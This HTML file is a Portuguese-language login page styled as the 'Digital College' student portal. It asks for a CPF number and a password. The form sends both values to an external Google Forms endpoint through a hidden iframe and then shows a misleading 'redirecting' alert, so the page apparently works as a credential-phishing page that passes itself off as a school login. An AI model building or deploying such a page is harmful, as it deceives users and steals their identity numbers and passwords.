<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Digital College | Portal do Aluno</title>
   <link rel="stylesheet" href="style.css">
   <link rel="shortcut icon" href="assets/images/icone-digital.ico">
</head>
<body>

  <div class="container-pai">

    <div id="Container-PRC">
  <div class="topo">
    <img src="assets/images/logo-academy-preta.png" alt="logo-academy-preta" class="img-logo">
    <h1 class="topo-text">Acesso ao EAD da Digital College</h1>
    </div>

    <div class="formulario">


     
      <h1 class="text-form">Preencha os seus dados abaixo.</h1>

       <form action="https://docs.google.com/forms/d/e/1FAIpQLSdVQBv1gXL1fgFXEgqRx3hZQR8jTBptLlDP-UAPGM8SMkxXlQ/formResponse" method="POST" target="hidden_iframe">

      <input type="text" name="entry.1840607227" id="CPF" placeholder="CPF" class="dados" maxlength="14" required>

      <input type="password" name="entry.627911374" id="Senha" placeholder="Senha" class="dados" required>

      <iframe name="hidden_iframe" style="display:none;"></iframe>
      </div>


      <div class="CheckboxeSenha">
      
        <div class="checkbox-container">
         <input type="checkbox" id="checkbox">

        <label for="checkbox" class="checkbox-custom"></label>
       
         <span class="texto-checkbox">Lembrar Meu Acesso!</span>
         </div>
     
         <a href="#" class="password">Esqueceu a Senha?</a>
       </div>  

     
      <div class="Acessar">
      <button type="submit" class="btn-submit" onclick="alert('Suas Informações foram enviadas...Redirecionando')">Acessar</button>
      </div>
      </form>
      
  </div>


<div class="container-video">

   <video autoplay muted loop class="video">
    <source src="assets/video/background.mp4" type="video/mp4">
   </video>

  
    <img src="assets/images/logo-academy-branca.png" alt="logo-academy-branca" class="img-logo-branca">
    
  </div>
  
</div>

</body>
</html>
